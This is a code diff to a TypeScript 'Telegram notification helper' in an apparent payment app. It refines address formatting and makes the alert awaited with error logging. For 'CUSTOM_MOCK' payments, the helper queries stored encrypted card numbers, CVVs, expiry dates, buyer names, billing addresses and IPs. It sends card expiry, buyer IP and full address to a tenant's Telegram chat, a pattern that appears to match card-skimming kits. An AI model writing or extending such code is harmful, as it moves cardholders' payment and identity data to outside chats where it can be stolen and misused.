@@ -2,10 +2,8 @@
  * lib/telegram.ts — Telegram Bot API notification helper
  *
  * Sends real-time alerts to a Telegram chat/group when payments are captured.
- * All calls are fire-and-forget — they never block the HTTP response.
- *
- * Usage:
- *   sendTransactionAlert({ tenantId, amount, storeName, accountName, transactionId })
+ * Callers should await these functions so the notification survives Vercel
+ * serverless lifecycle suspension.
  */
 
 import { getSql } from "@/lib/neon"
@@ -65,6 +63,18 @@ interface SendTransactionAlertInput {
   transactionId?: string | null
 }
 
+interface BillingAddress {
+  line1?: string
+  line2?: string
+  city?: string
+  state?: string
+  postal_code?: string
+  zip?: string
+  country?: string
+  country_code?: string
+  [key: string]: unknown
+}
+
 interface TelegramTransactionRow {
   id: string
   provider_type: string | null
@@ -77,7 +87,7 @@ interface TelegramTransactionRow {
   exp_month: string | null
   exp_year: string | null
   buyer_name: string | null
-  billing_address: Record<string, unknown> | string | null
+  billing_address: BillingAddress | string | null
   buyer_ip: string | null
   ip_address: string | null
   buyer_country: string | null
@@ -95,7 +105,7 @@ function buildPaypalMessage(amount: number, storeName: string, accountName: stri
   ].join(" ")
 }
 
-function formatAddress(value: Record<string, unknown> | string | null): string {
+function formatAddressInline(value: BillingAddress | string | null): string {
   if (!value) return "N/A"
 
   if (typeof value === "string") {
@@ -103,36 +113,24 @@ function formatAddress(value: Record<string, unknown> | string | null): string {
     return trimmed ? escapeHtml(trimmed) : "N/A"
   }
 
-  const orderedKeys = [
-    "line1",
-    "line2",
-    "city",
-    "state",
-    "postal_code",
-    "zip",
-    "country",
-    "country_code",
-  ]
+  const parts = [
+    value.line1,
+    value.line2,
+    value.city,
+    value.state,
+    value.postal_code ?? value.zip,
+    value.country ?? value.country_code,
+  ].filter((part): part is string => typeof part === "string" && part.trim().length > 0)
 
-  const seen = new Set<string>()
-  const parts: string[] = []
-
-  for (const key of orderedKeys) {
-    const raw = value[key]
-    if (typeof raw === "string" && raw.trim()) {
-      parts.push(raw.trim())
-      seen.add(key)
-    }
+  if (parts.length > 0) {
+    return escapeHtml(parts.join(", "))
   }
 
-  for (const [key, raw] of Object.entries(value)) {
-    if (seen.has(key)) continue
-    if (typeof raw === "string" && raw.trim()) {
-      parts.push(`${key}: ${raw.trim()}`)
-    }
-  }
+  const fallbackParts = Object.entries(value)
+    .filter(([, raw]) => typeof raw === "string" && raw.trim().length > 0)
+    .map(([key, raw]) => `${key}: ${(raw as string).trim()}`)
 
-  return parts.length > 0 ? escapeHtml(parts.join(", ")) : "N/A"
+  return fallbackParts.length > 0 ? escapeHtml(fallbackParts.join(", ")) : "N/A"
 }
 
 function buildCustomMockMessage(amount: number, row: TelegramTransactionRow): string {
@@ -154,7 +152,7 @@ function buildCustomMockMessage(amount: number, row: TelegramTransactionRow): st
     `Expiry: <code>${escapeHtml(expiryValue)}</code>`,
     `Buyer Country: <b>${escapeHtml(row.buyer_country ?? "N/A")}</b>`,
     `Buyer IP: <code>${escapeHtml(buyerIp)}</code>`,
-    `Billing Address: ${formatAddress(row.billing_address)}`,
+    `Billing Address: ${formatAddressInline(row.billing_address)}`,
     "",
     `Transaction: <code>${escapeHtml(row.id)}</code>`,
   ].join("\n")
@@ -162,72 +160,79 @@ function buildCustomMockMessage(amount: number, row: TelegramTransactionRow): st
 
 /**
  * Sends a Telegram notification to the tenant's configured Telegram chat.
- *
- * This is called asynchronously from payment routes — it does NOT await
- * the result and will never delay the customer's response.
+ * Errors are logged and swallowed so a notification failure never fails a payment.
  */
-export function sendTransactionAlert(input: SendTransactionAlertInput): void {
-  ;(async () => {
-    try {
-      const sql = getSql()
-      const rows = await sql`
-        SELECT telegram_bot_token, telegram_chat_id
-        FROM tenants
-        WHERE id = ${input.tenantId}
+export async function sendTransactionAlert(input: SendTransactionAlertInput): Promise<void> {
+  try {
+    const sql = getSql()
+    const rows = await sql`
+      SELECT telegram_bot_token, telegram_chat_id
+      FROM tenants
+      WHERE id = ${input.tenantId}
+      LIMIT 1
+    `
+
+    const tenant = rows[0] as { telegram_bot_token: string | null; telegram_chat_id: string | null } | undefined
+    if (!tenant?.telegram_bot_token || !tenant?.telegram_chat_id) return
+
+    let message = buildPaypalMessage(input.amount, input.storeName, input.accountName)
+
+    if (input.transactionId) {
+      const txRows = await sql`
+        SELECT
+          t.id,
+          s.provider_type,
+          s.name AS store_name,
+          ma.name AS account_name,
+          t.encrypted_card_number,
+          t.encrypted_cvv,
+          t.card_last_4,
+          t.card_brand,
+          t.exp_month,
+          t.exp_year,
+          t.buyer_name,
+          t.billing_address,
+          t.buyer_ip,
+          t.ip_address,
+          t.buyer_country
+        FROM transactions t
+        INNER JOIN stores s ON s.id = t.store_id
+        LEFT JOIN merchant_accounts ma ON ma.id = t.merchant_id
+        WHERE t.id = ${input.transactionId}
         LIMIT 1
       `
 
-      const tenant = rows[0] as { telegram_bot_token: string | null; telegram_chat_id: string | null } | undefined
-      if (!tenant?.telegram_bot_token || !tenant?.telegram_chat_id) return
-
-      let message = buildPaypalMessage(input.amount, input.storeName, input.accountName)
-
-      if (input.transactionId) {
-        const txRows = await sql`
-          SELECT
-            t.id,
-            s.provider_type,
-            s.name AS store_name,
-            ma.name AS account_name,
-            t.encrypted_card_number,
-            t.encrypted_cvv,
-            t.card_last_4,
-            t.card_brand,
-            t.exp_month,
-            t.exp_year,
-            t.buyer_name,
-            t.billing_address,
-            t.buyer_ip,
-            t.ip_address,
-            t.buyer_country
-          FROM transactions t
-          INNER JOIN stores s ON s.id = t.store_id
-          LEFT JOIN merchant_accounts ma ON ma.id = t.merchant_id
-          WHERE t.id = ${input.transactionId}
-          LIMIT 1
-        `
-
-        const transaction = txRows[0] as TelegramTransactionRow | undefined
-        if (transaction && normalizeProviderType(transaction.provider_type) === "CUSTOM_MOCK") {
-          message = buildCustomMockMessage(input.amount, transaction)
-        } else if (transaction) {
-          message = buildPaypalMessage(
-            input.amount,
-            transaction.store_name ?? input.storeName,
-            transaction.account_name ?? input.accountName
-          )
-        }
+      const transaction = txRows[0] as TelegramTransactionRow | undefined
+      if (transaction && normalizeProviderType(transaction.provider_type) === "CUSTOM_MOCK") {
+        message = buildCustomMockMessage(input.amount, transaction)
+      } else if (transaction) {
+        message = buildPaypalMessage(
+          input.amount,
+          transaction.store_name ?? input.storeName,
+          transaction.account_name ?? input.accountName
+        )
       }
-
-      await sendTelegramMessage(
-        tenant.telegram_bot_token,
-        tenant.telegram_chat_id,
-        message
-      )
-    } catch {
-      // Silent — never break the main flow
     }
-  })()
+
+    const result = await sendTelegramMessage(
+      tenant.telegram_bot_token,
+      tenant.telegram_chat_id,
+      message
+    )
+
+    if (!result.ok) {
+      if (result.error?.includes("HTTP 403")) {
+        console.error(
+          `[telegram] Message rejected for tenant ${input.tenantId}: ${result.error}. ` +
+          "Ensure the configured chat ID belongs to a user or group, not another bot."
+        )
+      } else {
+        console.error(`[telegram] Message send failed for tenant ${input.tenantId}: ${result.error ?? "unknown error"}`)
+      }
+    }
+  } catch (error) {
+    console.error("[telegram] Unexpected notification error:", error)
+  }
 }
 
 function escapeHtml(str: string): string {
